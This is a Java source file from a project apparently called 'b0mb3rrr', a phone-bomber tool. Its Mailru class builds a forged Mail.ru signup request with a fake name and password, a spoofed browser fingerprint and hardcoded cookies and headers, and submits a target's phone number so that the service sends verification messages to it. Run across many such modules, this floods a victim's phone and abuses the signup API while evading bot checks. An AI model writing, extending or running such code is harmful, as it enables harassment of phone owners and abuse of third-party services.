package me.oneqxz.b0mb3rrr.services.impl;

import me.oneqxz.b0mb3rrr.data.Phone;
import me.oneqxz.b0mb3rrr.services.Service;
import okhttp3.Request;
import okhttp3.MultipartBody;
import okhttp3.RequestBody;

public class Mailru extends Service {
    @Override
    public Request.Builder buildRequest(Phone phone) {
        RequestBody requestBody = new MultipartBody.Builder()
                .setType(MultipartBody.FORM)
                .addFormDataPart("extended", "true")
                .addFormDataPart("more_password_strength", "1")
                .addFormDataPart("context", "signup")
                .addFormDataPart("browser", "{\"screen\":{\"availWidth\":\"1920\",\"availHeight\":\"1049\",\"width\":\"1920\",\"height\":\"1080\",\"colorDepth\":\"24\",\"pixelDepth\":\"24\",\"top\":\"0\",\"left\":\"0\",\"availTop\":\"31\",\"availLeft\":\"0\",\"mozOrientation\":\"landscape-primary\",\"onmozorientationchange\":\"inaccessible\"},\"navigator\":{\"pdfViewerEnabled\":\"true\",\"doNotTrack\":\"unspecified\",\"maxTouchPoints\":\"0\",\"oscpu\":\"Linux x86_64\",\"vendor\":\"\",\"vendorSub\":\"\",\"productSub\":\"20100101\",\"cookieEnabled\":\"true\",\"buildID\":\"20181001000000\",\"globalPrivacyControl\":\"false\",\"webdriver\":\"false\",\"hardwareConcurrency\":\"12\",\"appCodeName\":\"Mozilla\",\"appName\":\"Netscape\",\"appVersion\":\"5.0 (X11)\",\"platform\":\"Linux x86_64\",\"userAgent\":\"Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0\",\"product\":\"Gecko\",\"language\":\"ru-RU\",\"onLine\":\"true\"},\"flash\":{\"version\":\"inaccessible\"}}")
                .addFormDataPart("from", "main")
                .addFormDataPart("sent_me_ads", "true")
                .addFormDataPart("sent_me_ads_common", "true")
                .addFormDataPart("name", STR."{\"first\":\"\{this.getFaker().name().firstName()}\",\"last\":\"\{this.getFaker().name().lastName()}\"}")
                .addFormDataPart("birthday", "{\"day\":3,\"month\":3,\"year\":1996}")
                .addFormDataPart("sex", "male")
                .addFormDataPart("login", this.getLogin())
                .addFormDataPart("domain", "mail.ru")
                .addFormDataPart("password", this.getFaker().internet().password())
                .addFormDataPart("phones", STR."[{\"phone\":\"\{phone.phone()}\",\"mobile\":true}]")
                .addFormDataPart("htmlencoded", "false")
                .addFormDataPart("utm", "{}")
                .addFormDataPart("referrer", "https://mail.ru/")
                .build();

        return new Request.Builder()
                .url("https://account.mail.ru/api/v1/user/signup")
                .post(requestBody)
                .header("User-Agent", "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0")
                .header("Accept", "application/json, text/plain, */*")
                .header("Accept-Language", "ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3")
                .header("Accept-Encoding", "gzip, deflate, br")
                .header("X-Requested-With", "XMLHttpRequest")
                .header("X-Request-Id", "b8aaa36a-3b8-4890-954c-a5ccc28f3114")
                .header("Content-Type", "multipart/form-data; boundary=---------------------------60963989223850477833570979028")
                .header("Origin", "https://account.mail.ru")
                .header("Connection", "keep-alive")
                .header("Referer", "https://account.mail.ru/signup?from=main&rf=auth.mail.ru&app_id_mytracker=58519")
                .header("Cookie", "act=1d31d163d8f944fea2bf6db0cd208f6e; o=:2435:BA==.m; oid=4ch77mnDYLK8gfNoXrp6F; mrcu=D7AF66182EBF2304AC1AAC29244E; s=ww=1920|wh=933; re_geomap2=false; re_theme=system; re_theme_actual=dark; switch_system_theme_disabled=1; ph_tp_horo-mail-ru=t=1|d=1712860867290; ph_ShowedSnowHint=1; mtrc=%7B%22mytrackerid%22%3A58519%7D; p=SVABAOsrTPYA; b=b00CALCfvYAAAAAAICYUdzQA; i=AQDJLhhmAQC9BwgEAUwDAQ==; c=2C4YZgAAoJ+9gAAhAAgADw4AAACQv+G2VuIB; VID=3SZ-yV0mW8IO00001X32nC2O:::0-0-0-b328786-0-b3287f0:CAASEEVFbssd3UKQi7Mx7dBTAvgaYM-Nn2RxwAYyPGsjCiQoP0_0aH24Kw0v4nzbRCcGC2KhnVUdzFPQK5RM64_2IMusKl8_0pxRU9VYvdpXrKGTlRXfH5VOqHuiahhT7N1jYWttRUFXYVprn0-ue-Hopf0xIQ; searchuid=1401779861712860879; tmr_lvid=3df61d3eae3617aeb8d93b7dd57ba762; tmr_lvidTS=1712860884998; tmr_detect=0%7C1712860887342; _ym_uid=1712860892877330610; _ym_d=1712860892; _ym_isad=2")
                .header("Sec-Fetch-Dest", "empty")
                .header("Sec-Fetch-Mode", "cors")
                .header("Sec-Fetch-Site", "same-origin")
                .header("TE", "trailers");
    }

    @Override
    public String getServiceName() {
        return "Mailru";
    }
}
